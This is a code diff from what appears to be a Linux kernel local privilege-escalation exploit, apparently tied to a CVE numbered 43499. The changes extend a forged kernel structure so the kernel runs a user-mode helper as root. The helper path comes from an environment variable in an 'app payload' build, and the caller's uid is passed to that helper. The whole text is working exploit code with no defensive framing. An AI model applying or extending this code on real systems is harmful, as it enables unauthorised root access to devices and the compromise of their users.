@@ -33,9 +33,10 @@ struct umh_completion {
 
 struct umh_kernel_data {
   struct umh_completion completion;
-  char path[48];
-  char arg[8];
-  uint64_t argv[3];
+  char path[256];
+  char arg[16];
+  char uid[16];
+  uint64_t argv[4];
   uint64_t envp[1];
 };
 
@@ -115,8 +116,22 @@ static int install_workqueue_umh_root(int fd) {
   uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
   struct umh_kernel_data umh_data;
   memset(&umh_data, 0, sizeof(umh_data));
-  snprintf(umh_data.path, sizeof(umh_data.path), "%s", ROOT_UMH_PATH);
+  const char *root_umh_path = ROOT_UMH_PATH;
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+  const char *app_root_umh_path = getenv("CVE43499_ROOT_HELPER");
+  if (!app_root_umh_path || app_root_umh_path[0] != '/') {
+    pr_error("root umh missing CVE43499_ROOT_HELPER\n");
+    return 0;
+  }
+  root_umh_path = app_root_umh_path;
+#endif
+  if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_umh_path) >=
+      (int)sizeof(umh_data.path)) {
+    pr_error("root umh helper path too long\n");
+    return 0;
+  }
   snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
+  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());
   uintptr_t completion_addr =
       umh_data_addr + offsetof(struct umh_kernel_data, completion);
   uintptr_t wait_list_addr =
@@ -125,6 +140,8 @@ static int install_workqueue_umh_root(int fd) {
       umh_data_addr + offsetof(struct umh_kernel_data, path);
   uintptr_t arg_addr =
       umh_data_addr + offsetof(struct umh_kernel_data, arg);
+  uintptr_t uid_addr =
+      umh_data_addr + offsetof(struct umh_kernel_data, uid);
   uintptr_t argv_addr =
       umh_data_addr + offsetof(struct umh_kernel_data, argv);
   uintptr_t envp_addr =
@@ -133,7 +150,8 @@ static int install_workqueue_umh_root(int fd) {
   umh_data.completion.prev = wait_list_addr;
   umh_data.argv[0] = path_addr;
   umh_data.argv[1] = arg_addr;
-  umh_data.argv[2] = 0;
+  umh_data.argv[2] = uid_addr;
+  umh_data.argv[3] = 0;
   umh_data.envp[0] = 0;
   uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);
 
